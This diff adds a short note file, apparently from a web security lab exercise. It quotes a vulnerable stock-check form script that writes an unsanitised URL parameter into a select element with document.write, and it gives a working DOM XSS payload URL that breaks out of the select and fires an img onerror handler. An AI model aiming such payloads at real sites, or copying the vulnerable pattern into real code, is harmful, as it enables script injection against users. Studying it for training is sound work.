@@ -1,0 +1,23 @@
+#break out of <select> statement
+
+#vulnerable JS
+<form id="stockCheckForm" action="/product/stock" method="POST">
+                            <input required type="hidden" name="productId" value="2">
+                            <script>
+                                var stores = ["London","Paris","Milan"];
+                                var store = (new URLSearchParams(window.location.search)).get('storeId');
+                                document.write('<select name="storeId">');
+                                if(store) {
+                                    document.write('<option selected>'+store+'</option>');
+                                }
+                                for(var i=0;i<stores.length;i++) {
+                                    if(stores[i] === store) {
+                                        continue;
+                                    }
+                                    document.write('<option>'+stores[i]+'</option>');
+                                }
+                                document.write('</select>');
+                            </script>
+                            
+#payload
+  product?productId=2&storeId=2"></select><img src=1 onerror=alert(document.domain)>
